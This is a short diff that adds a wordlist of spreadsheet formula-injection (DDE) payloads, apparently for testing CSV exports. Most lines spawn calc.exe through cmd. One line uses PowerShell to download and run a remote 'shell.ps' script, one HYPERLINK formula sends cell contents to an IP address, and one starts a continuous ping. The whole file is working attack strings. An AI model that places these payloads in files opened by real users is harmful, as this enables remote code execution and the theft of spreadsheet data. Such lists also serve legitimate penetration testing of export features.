@@ -1,0 +1,10 @@
+=cmd|'/C calc.exe'!Z0
+=calc|a!z
+=cmd|'/Cpowershell Import-Module BitsTransfer; Start-BitsTransfer -source https://141.io/shell.ps; Invoke-Item shell.ps;'!z
+=cmd|'/Ccalc.exe'!z
+=HYPERLINK(“http://172.0.0.1:8000?leads="&A2&B2, “More here”)
+=cmd|’/C ping -t 172.0.0.1 -l 25152'!’A1'
+=sum(10+10)
+=cmd|’ /C calc’!A0
+DDE (“cmd”;”/C calc”;”!A0″)
+@SUM(1+1)*cmd|' /C calc'!A0
